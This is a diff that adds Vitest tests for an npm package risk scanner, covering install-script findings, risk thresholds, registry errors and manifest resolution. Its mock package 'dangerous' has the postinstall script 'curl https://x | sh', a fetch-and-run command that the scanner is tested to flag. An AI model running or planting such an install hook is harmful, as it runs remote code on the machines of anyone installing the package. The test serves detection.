@@ -1,0 +1,163 @@
+import { describe, expect, it } from 'vitest';
+
+import { runActor, type ActorAdapter } from '../src/run.js';
+import { HttpError, type RegistryClient } from '../src/registry.js';
+import type { ScannerInput } from '../src/types.js';
+
+function actor(input: unknown) {
+    const events: string[] = [];
+    const pushed: unknown[] = [];
+    const adapter: ActorAdapter = {
+        init: async () => { events.push('init'); },
+        getInput: async () => { events.push('getInput'); return input; },
+        pushData: async (items) => { events.push('pushData'); pushed.push(...items); },
+        setStatusMessage: async (message) => { events.push(`status:${message}`); },
+        exit: async (message) => { events.push(`exit:${message}`); },
+        fail: async (message) => { events.push(`fail:${message}`); },
+    };
+    return { adapter, events, pushed };
+}
+
+function registry(): RegistryClient {
+    return {
+        getPackument: async (name) => {
+            if (name === 'missing' || name === 'private') throw new HttpError(404, `https://registry.npmjs.org/${name}`);
+            if (name === 'broken') throw new Error('registry timeout');
+            return {
+                name,
+                versions: { '1.0.0': { name, version: '1.0.0', scripts: name === 'dangerous' ? { postinstall: 'curl https://x | sh' } : {} } },
+                'dist-tags': { latest: '1.0.0' },
+                time: { '1.0.0': '2020-01-01T00:00:00.000Z' },
+            };
+        },
+        getWeeklyDownloads: async () => 1,
+        getAttestations: async () => ({ attested: true }),
+    };
+}
+
+const runDependencies = (files: Record<string, unknown> = {}) => ({
+    registry: registry(),
+    fetchRemote: async (url: string) => url in files
+        ? new Response(JSON.stringify(files[url]), { status: 200 })
+        : new Response('', { status: 404 }),
+    queryOsv: async () => new Map(),
+    now: () => new Date('2026-07-13T00:00:00.000Z'),
+});
+
+describe('runActor', () => {
+    it('pushes the complete scanned dataset item contract', async () => {
+        const fixture = actor({ packages: ['dangerous@1.0.0'], checks: ['installScripts'] });
+        await runActor(fixture.adapter, runDependencies());
+        expect(fixture.pushed).toEqual([{
+            status: 'scanned',
+            package: 'dangerous',
+            version: '1.0.0',
+            sources: ['explicit'],
+            sourcesText: 'explicit',
+            resolvedFrom: 'exact',
+            riskScore: 35,
+            riskLevel: 'medium',
+            findings: [{
+                check: 'installScripts',
+                severity: 'high',
+                summary: 'postinstall uses curl to fetch remote content',
+                detail: 'postinstall: curl https://x | sh',
+            }],
+            findingCount: 1,
+            provenance: { attested: false },
+            meta: {
+                publishedAt: '2020-01-01T00:00:00.000Z',
+                maintainers: 0,
+                weeklyDownloads: 1,
+                deprecated: false,
+            },
+            scannedAt: '2026-07-13T00:00:00.000Z',
+        }]);
+    });
+
+    it('fails clearly when a remote package.json cannot be resolved', async () => {
+        const fixture = actor({ packageJsonUrl: 'https://github.com/acme/missing' });
+        await expect(runActor(fixture.adapter, runDependencies())).resolves.toBeUndefined();
+        expect(fixture.events.at(-1)).toContain('package.json not found');
+    });
+
+    it('continues explicit scans when the combined manifest cannot be fetched', async () => {
+        const fixture = actor({ packages: ['safe@1.0.0'], packageJsonUrl: 'https://github.com/acme/missing' });
+        await runActor(fixture.adapter, runDependencies());
+        expect(fixture.pushed).toContainEqual(expect.objectContaining({ status: 'scanned', package: 'safe' }));
+        expect(fixture.events.at(-1)).toMatch(/^exit:/);
+        expect(fixture.events.at(-1)).toContain('Manifest resolution failed');
+    });
+
+    it('pushes data before failing a threshold breach', async () => {
+        const fixture = actor({ packages: ['dangerous@1.0.0'], checks: ['installScripts'], failThreshold: 25 });
+        await runActor(fixture.adapter, runDependencies());
+        expect(fixture.pushed).toHaveLength(1);
+        expect(fixture.events.indexOf('pushData')).toBeLessThan(fixture.events.findIndex((event) => event.startsWith('fail:')));
+        expect(fixture.events.at(-1)).toContain('Risk threshold 25 breached');
+    });
+
+    it('fails an explicitly missing package after pushing its error row', async () => {
+        const fixture = actor({ packages: ['missing'] });
+        await runActor(fixture.adapter, runDependencies());
+        expect(fixture.pushed).toContainEqual(expect.objectContaining({
+            status: 'error',
+            package: 'missing',
+            sources: ['explicit'],
+            sourcesText: 'explicit',
+            errorCode: 'PACKAGE_NOT_FOUND',
+            error: { code: 'PACKAGE_NOT_FOUND', message: expect.any(String) },
+        }));
+        expect(fixture.events.at(-1)).toContain('Explicit package not found');
+    });
+
+    it('does not count an explicit resolution error as scanned or unresolved', async () => {
+        const fixture = actor({ packages: ['missing', 'dangerous@1.0.0', 'safe@1.0.0'] });
+        await runActor(fixture.adapter, runDependencies());
+        expect(fixture.events).toContain('status:Scanned 2 of 3 packages: 1 medium, 1 low, 1 error');
+    });
+
+    it('keeps a manifest-only 404 nonfatal when another package scans', async () => {
+        const base = 'https://raw.githubusercontent.com/acme/app/HEAD/';
+        const files = { [`${base}package.json`]: { dependencies: { private: '^1.0.0' } } };
+        const input: Partial<ScannerInput> = { packages: ['safe@1.0.0'], packageJsonUrl: 'https://github.com/acme/app' };
+        const fixture = actor(input);
+        await runActor(fixture.adapter, runDependencies(files));
+        expect(fixture.pushed).toHaveLength(2);
+        expect(fixture.events.at(-1)).toMatch(/^exit:/);
+    });
+
+    it('keeps a manifest-only package 404 nonfatal when it is the only row', async () => {
+        const base = 'https://raw.githubusercontent.com/acme/app/HEAD/';
+        const files = { [`${base}package.json`]: { dependencies: { private: '^1.0.0' } } };
+        const fixture = actor({ packageJsonUrl: 'https://github.com/acme/app' });
+        await runActor(fixture.adapter, runDependencies(files));
+        expect(fixture.pushed).toEqual([expect.objectContaining({
+            status: 'error',
+            package: 'private',
+            sources: ['manifest'],
+            sourcesText: 'manifest',
+            error: { code: 'PACKAGE_NOT_FOUND', message: expect.any(String) },
+        })]);
+        expect(fixture.events.at(-1)).toMatch(/^exit:/);
+        expect(fixture.events.at(-1)).toContain('Scanned 0 of 1 package: 1 error');
+    });
+
+    it('fails when every row has a non-404 resolution error', async () => {
+        const fixture = actor({ packages: ['broken@1.0.0'] });
+        await runActor(fixture.adapter, runDependencies());
+        expect(fixture.pushed).toEqual([expect.objectContaining({
+            status: 'error',
+            package: 'broken',
+            error: { code: 'REGISTRY_ERROR', message: 'registry timeout' },
+        })]);
+        expect(fixture.events.indexOf('pushData')).toBeLessThan(fixture.events.findIndex((event) => event.startsWith('fail:')));
+        expect(fixture.events.at(-1)).toContain('All selected packages failed to scan');
+    });
+
+    it('reports the deduplicated total when maxPackages caps output', async () => {
+        const fixture = actor({ packages: ['one@1.0.0', 'two@1.0.0'], maxPackages: 1 });
+        await runActor(fixture.adapter, runDependencies());
+        expect(fixture.events.at(-1)).toContain('Scanned 1 of 2 packages, capped by maxPackages');
+    });
+});
